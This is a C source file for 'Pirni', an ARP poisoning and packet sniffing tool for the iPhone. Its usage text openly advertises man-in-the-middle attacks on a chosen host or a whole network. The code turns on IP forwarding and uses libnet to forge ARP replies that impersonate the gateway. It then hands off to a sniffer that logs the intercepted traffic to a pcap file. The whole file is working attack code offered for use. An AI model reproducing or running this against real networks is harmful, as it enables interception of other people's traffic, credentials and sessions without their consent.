/* Pirni ARP poisoning and packet sniffing -- n1mda, for the iPhone
	compile with (arm-apple-darwin9-)gcc *.c -o pirni -lpcap -lnet -pthread */

#include "pirni.h"

#define VERSION "1.1.1"

void print_usage(char *name)
{
	printf("Pirni ARP Spoofer / packet sniffer v%s ( http://n1mda-dev.googlecode.com )\n", VERSION);
	printf("Usage:\t%s [Options] -s <source_ip> -o <logfile>\n\n", name);
	printf("OPTIONS:\n");
	printf("\t-s: Specifies the IP-adress you want to spoof, most likely the default gateway/router\n");
	printf("\t-d: Specifies the target you want to perform MITM on. Broadcast IP (entire network) will be used if nothing else is supplied\n");
	printf("\t-f: Specifies the Berkley Packet Filter so that pirni only collects interesting packets. Read the userguide for more information\n\n");
	printf("You can later on transfer the dumpfile to your computer and open it with Wireshark (or any other packet analyzer that supports pcap) to analyze the traffic\n\n");
	printf("EXAMPLES:\n");
	printf("\t%s -s 192.168.0.1 -o log.pcap\n", name);
	printf("\t%s -s 192.168.0.1 -d 192.168.0.128 -f \"tcp dst port 80\" -o log.pcap\n", name);
	printf("\t%s -i en1 -s 192.168.0.1 -d 255.255.255.0 -o log.pcap\n", name);
	printf("SEE THE USERGUIDE FOR DETAILED DESCRIPTIONS AND MORE EXAMPLES ( http://n1mda-dev.google.com )\n");
	
	return;
}

void set_forwarding(int state)
{
	if(state < 0 || state > 1)
		return;
		
	if(sysctlbyname("net.inet.ip.forwarding", NULL, NULL, &state, sizeof(state)) == -1)
	{
		printf("[-] Error setting ip forwarding\n");
		exit(1);
	}
}

int main(int argc, char *argv[])
{
	/* Libnet init and headers */
	libnet_ptag_t	eth_tag, arp_tag;
	
	/* Error buffer and device */
	char			errbuf[LIBNET_ERRBUF_SIZE];
	char			*BPFfilter = "";
	static u_char	SrcHW[ETH_ALEN];
	static u_char	DstHW[ETH_ALEN]					= {0xff, 0xff, 0xff, 0xff, 0xff, 0xff};
	int c;


	/* Structure for local MAC */
	struct libnet_ether_addr *local_mac;
	
	if(getuid()) {
		printf("Must run as root\n");
		exit(1);
	}
	
	while((c = getopt(argc, argv, "i:s:d:f:o:")) != -1) {
		switch(c) {
			case 'i':
						device = optarg;
						break;
			case 's':
						SrcIP = inet_addr(optarg);
						break;
			case 'd':
						DstIP = inet_addr(optarg);
						break;
			case 'f':
						BPFfilter = optarg;
						break;
			case 'o':
						outputFile = optarg;
						break;
			case '?':
						printf("Unrecognized option: -%c\n", optopt);
						exit(2);
						break;
			default:
						print_usage(argv[0]);
						exit(2);
					}
				}


	if(outputFile == NULL) {
		print_usage(argv[0]);
		exit(2);
	}

	if(device == NULL) {
		device = "en0";
	}

	
	printf("[+] Initializing packet forwarding\n");
	set_forwarding(1);
	
	signal(SIGINT, sigint_handler);
	
	printf("[+] Initializing libnet on %s\n", device);
	l = libnet_init(LIBNET_LINK, device, errbuf);
	if(l == NULL) {
		printf("[-] libnet_init() failed: %s\n", errbuf);
		exit(1);
	}
	
	/* Get local MAC address */
	local_mac = libnet_get_hwaddr(l);
	if(local_mac != NULL) {
		printf("[*] Your MAC address: %02X:%02X:%02X:%02X:%02X:%02X\n", \
									local_mac->ether_addr_octet[0],\
									local_mac->ether_addr_octet[1],\
									local_mac->ether_addr_octet[2],\
									local_mac->ether_addr_octet[3],\
									local_mac->ether_addr_octet[4],\
									local_mac->ether_addr_octet[5]);
		memcpy(SrcHW, local_mac, ETH_ALEN);
	} else {
		printf("[-] Could not parse your own MAC address: %s\n", libnet_geterror(l));
		libnet_destroy(l);
		return 0;
	}

	if(DstIP == 0)
	{
		int socketd;
		socketd = socket(AF_INET, SOCK_DGRAM, 0);
		if(socketd <= 0)
		{
			printf("[-] Error opening socket\n");
			return 0;
		}
		
		struct ifreq ifr;
	
		strcpy(ifr.ifr_name, device);
	
		if(0 == ioctl(socketd, SIOCGIFBRDADDR, &ifr))
		{
			struct sockaddr_in sin;
			memcpy(&sin, &ifr.ifr_addr, sizeof(struct sockaddr));
			DstIP = sin.sin_addr.s_addr;
		}
		printf("[*] Your broadcast adress: %s\n", inet_ntoa( *(struct in_addr *)&DstIP)); 
	
		close(socketd);
	}

	/* Create ARP header */
	printf("[+] Creating ARP header\n");
	arp_tag = libnet_build_arp(
				1,						/* hardware type */
				0x0800,					/* proto type */
				6,						/* hw addr size */
				4,						/* proto addr size */
				ARP_REPLY,				/* ARP OPCODE */
				SrcHW,					/* source HW addr */
				(u_char *)&SrcIP,		/* src proto addr */
				DstHW,					/* dst HW addr */
				(u_char *)&DstIP,		/* dst IP addr */
				NULL,					/* no payload */
				0,						/* payload length */
				l,						/* libnet tag */
				0);						/* ptag see man */

	if(arp_tag == -1) {
		printf("[-] libnet_build_arp() failed: %s\n", libnet_geterror(l));
		exit(1);
	}
	
	/* Create Ethernet header */
	printf("[+] Creating Ethernet header\n");
	eth_tag = libnet_build_ethernet(
				DstHW,					/* dst HW addr */
				SrcHW,					/* src HW addr */
				0x0806,					/* Ether packet type */
				NULL,					/* pointer to payload */
				0,						/* payload size */
				l,						/* libnet tag */
				0);						/* Pointer to packet memory */
	
	if(eth_tag == -1) {
		printf("libnet_build_ethernet() failed: %s\n", libnet_geterror(l));
		exit(1);
	}
	
	/* Send ARP response */

	LaunchThread();
	initSniffer(BPFfilter, outputFile);
	
	libnet_destroy(l);
	return 0;
}

void sigint_handler(int sig)
{
	printf("\n[*] Removing packet forwarding\n");
	set_forwarding(0);
	
	exit(0);
}
